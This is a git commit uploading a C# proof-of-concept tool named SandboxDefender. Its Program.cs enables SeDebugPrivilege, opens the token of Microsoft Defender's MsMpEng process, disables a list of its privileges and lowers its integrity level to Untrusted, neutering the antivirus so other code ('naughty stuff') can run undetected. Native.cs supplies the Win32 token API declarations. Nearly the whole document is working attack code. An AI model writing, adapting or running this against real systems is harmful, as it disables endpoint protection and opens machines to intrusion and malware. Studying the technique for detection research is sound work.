a01f639c63dbf1cb62bee71a1ee39de86be78f52
John Tear <42491100+plackyhacker@users.noreply.github.com>
2022-02-05 08:40:23 +0000

    Uploaded project.

---
+++ SandboxDefender/Native.cs
@@ -0,0 +1,126 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace SandboxDefender
+{
+    public static class Native
+    {
+        public enum TOKEN_INFORMATION_CLASS
+        {
+            TokenUser = 1,
+            TokenGroups,
+            TokenPrivileges,
+            TokenOwner,
+            TokenPrimaryGroup,
+            TokenDefaultDacl,
+            TokenSource,
+            TokenType,
+            TokenImpersonationLevel,
+            TokenStatistics,
+            TokenRestrictedSids,
+            TokenSessionId,
+            TokenGroupsAndPrivileges,
+            TokenSessionReference,
+            TokenSandBoxInert,
+            TokenAuditPolicy,
+            TokenOrigin,
+            TokenElevationType,
+            TokenLinkedToken,
+            TokenElevation,
+            TokenHasRestrictions,
+            TokenAccessInformation,
+            TokenVirtualizationAllowed,
+            TokenVirtualizationEnabled,
+            TokenIntegrityLevel,
+            TokenUIAccess,
+            TokenMandatoryPolicy,
+            TokenLogonSid,
+            MaxTokenInfoClass
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SID_AND_ATTRIBUTES
+        {
+            public IntPtr Sid;
+            public uint Attributes;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_MANDATORY_LABEL
+        {
+            public SID_AND_ATTRIBUTES Label;
+        }
+
+        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
+        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
+        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
+        public const UInt32 TOKEN_DUPLICATE = 0x0002;
+        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
+        public const UInt32 TOKEN_QUERY = 0x0008;
+        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
+        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
+        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
+        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
+        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
+        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
+        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID);
+
+        public const Int32 ANYSIZE_ARRAY = 1;
+
+        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
+        public const UInt32 SE_PRIVILEGE_DISABLED = 0x00000004;
+
+        public const int ERROR_NOT_ALL_ASSIGNED = 0x00000514;
+
+        public const UInt32 PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
+
+        public const UInt32 SE_GROUP_INTEGRITY = 0x20;
+
+        public const string ML_SYSTEM = "S-1-16-16384";
+        public const string ML_UNTRUSTED = "S-1-16-0";
+
+        [StructLayout(LayoutKind.Sequential, Pack = 4)]
+        public struct LUID_AND_ATTRIBUTES
+        {
+            public LUID Luid;
+            public UInt32 Attributes;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID
+        {
+            public uint LowPart;
+            public uint HighPart;
+        }
+
+        public struct TOKEN_PRIVILEGES
+        {
+            public int PrivilegeCount;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
+            public LUID_AND_ATTRIBUTES[] Privileges;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll")]
+        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 Zero, IntPtr Null1, IntPtr Null2);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern Boolean SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint GetLastError();
+    }
+}
---
+++ SandboxDefender/Program.cs
@@ -0,0 +1,192 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+using static SandboxDefender.Native;
+
+namespace SandboxDefender
+{
+    class Program
+    {
+        // this works for the poc, enumerating the current privileges would be a better solution
+        private static string[] privs = new string[]
+        {
+            "SeAssignPrimaryTokenPrivilege",
+            "SeBackupPrivilege",
+            "SeDebugPrivilege",
+            "SeChangeNotifyPrivilege",
+            "SeImpersonatePrivilege",
+            "SeIncreaseBasePriorityPrivilege",
+            "SeIncreaseQuotaPrivilege",
+            "SeLoadDriverPrivilege",
+            "SeRestorePrivilege",
+            "SeSecurityPrivilege",
+            "SeShutdownPrivilege",
+            "SeSystemEnvironmentPrivilege",
+            "SeTakeOwnershipPrivilege",
+            "SeTcbPrivilege"
+        };
+
+        static void Main(string[] args)
+        {
+            // handle for this processes token
+            IntPtr hProcessToken = IntPtr.Zero;
+            // handle for the Defender process
+            IntPtr hProcess = IntPtr.Zero;
+
+            // get a handle to this process' token
+            Console.WriteLine("[+] Getting a token handle for this process.");
+            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, out IntPtr hTokenHandle))
+                return;
+
+            Console.WriteLine("[+] Token handle: 0x{0}", hTokenHandle.ToString("X"));
+
+            // enable the SeDebugPriv
+            Console.WriteLine("[+] Enabling SeDebugPrivilege.");
+            if (!SetPrivilege(hTokenHandle, "SeDebugPrivilege"))
+            {
+                Console.WriteLine("[!] Unable to enable the SeDebugPrivilege, check that you have this privilege!");
+                return;
+            }
+
+            Console.WriteLine("[+] SeDebugPrivilege enabled.");
+
+            // break defender
+            SandboxDefender();
+
+            // do naughty stuff
+
+            // fix defender - TODO fix codez! xD
+            SandboxDefender(true);
+
+            Console.WriteLine("[+] Done... Have a nice day!");
+        }
+
+        static private bool SandboxDefender(bool fix = false)
+        {
+            IntPtr hProcess = IntPtr.Zero;
+
+            // get a handle to the Defender process - remember we must be able to enable the SeDebugPrivilege
+            try
+            {
+                // first get the pid
+                int pid = Process.GetProcessesByName("MsMpEng")[0].Id;
+                Console.WriteLine("[+] Defender PID: {0}", pid);
+
+                // we have to use the Win32 API, using .Net throws an exception as we can't use PROCESS_QUERY_LIMITED_INFORMATION
+                Console.WriteLine("[+] Getting a process handle for Defender.");
+                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
+
+                // throw a general exception which will get caught below
+                if (hProcess == IntPtr.Zero)
+                    throw new Exception();
+
+                Console.WriteLine("[+] Process handle: 0x{0}", hProcess.ToString("X"));
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Unable to get a handle to the process, check you have the correct privileges!");
+                Console.WriteLine("[!] {0}", ex.Message);
+                return false;
+            }
+
+            // get a handle to this process' token
+            Console.WriteLine("[+] Getting a token handle for the Defender process.");
+            if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out IntPtr hTokenHandle))
+            {
+                Console.WriteLine("[!] Unable to get a handle to the process token, ffs!");
+                return false;
+            }
+
+            Console.WriteLine("[+] Token handle: 0x{0}", hTokenHandle.ToString("X"));
+
+            if (!fix)
+            {
+                // break defender
+                Console.WriteLine("[+] Will disable Defender privileges.");
+
+                for (int i = 0; i < privs.Length; i++)
+                {
+                    if (!SetPrivilege(hTokenHandle, privs[i], false))
+                    {
+                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
+                    }
+                }
+
+                Console.WriteLine("[+] Will set Defender Integrity to Untrusted.");
+                if (!SetIntegrity(hTokenHandle, ML_UNTRUSTED))
+                {
+                    Console.WriteLine("[!] Unable to set integrity to Untrusted!");
+                }
+            }
+            else
+            {
+                // fix defender
+                // TODO - this does not work - ERROR_TOKEN_ALREADY_IN_USE
+                Console.WriteLine("[+] Will enable Defender privileges.");
+
+                for (int i = 0; i < privs.Length; i++)
+                {
+                    if (!SetPrivilege(hTokenHandle, privs[i]))
+                    {
+                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
+                    }
+                }
+
+                Console.WriteLine("[+] Will set Defender Integrity to System.");
+                if (!SetIntegrity(hTokenHandle, ML_SYSTEM))
+                {
+                    Console.WriteLine("[!] Unable to set integrity to System!");
+                }
+            }
+
+            return true;
+        }
+
+        static bool SetPrivilege(IntPtr hToken, string privilege, bool enable=true)
+        {
+            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+            LUID lpLuid = new LUID();
+
+            if(!LookupPrivilegeValue(string.Empty, privilege, ref lpLuid))
+                return false;
+
+            tp.PrivilegeCount = 1;
+            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
+            tp.Privileges[0].Luid = lpLuid;
+
+            if (enable)
+                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            else
+                tp.Privileges[0].Attributes = SE_PRIVILEGE_DISABLED;
+
+            if(!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+                return false;
+            
+            if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+                return false;
+
+            return true;
+        }
+
+        static bool SetIntegrity(IntPtr hToken, string integrity)
+        {
+            TOKEN_MANDATORY_LABEL tml = default;
+            tml.Label.Sid = IntPtr.Zero;
+            tml.Label.Attributes = SE_GROUP_INTEGRITY;
+            tml.Label.Sid = IntPtr.Zero;
+
+            ConvertStringSidToSid(integrity, out tml.Label.Sid);
+
+            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
+            Marshal.StructureToPtr(tml, tmlPtr, false);
+
+            if(!SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml)))
+            {
+                return false;
+            }
+
+            return true;
+        }
+    }
+}
